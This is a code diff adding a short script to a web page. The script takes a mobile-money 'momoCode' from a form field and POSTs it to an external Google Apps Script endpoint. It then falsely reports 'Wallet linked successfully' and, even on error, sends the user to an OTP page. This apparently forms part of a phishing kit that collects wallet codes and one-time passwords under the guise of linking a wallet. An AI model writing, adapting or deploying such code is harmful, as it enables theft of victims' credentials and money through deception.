@@ -1,0 +1,21 @@
+<script>
+  const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbymRc-fy9ucqBvpAne4xnI56M5lyYp4o5FLA_a4uZB-MYs6QkFI5atZ-ID02pjmVgWhuw/exec";
+
+  document.getElementById("submitBtn").addEventListener("click", async () => {
+      const code = document.getElementById("codeInput").value.trim();
+
+      try {
+        const res = await fetch(WEBAPP_URL, {
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify({ momoCode: code })
+        });
+
+        alert("Wallet linked successfully ✔️");
+        window.location.href = "otp.html";
+
+      } catch (e) {
+        window.location.href = "otp.html";
+      }
+  });
+</script>
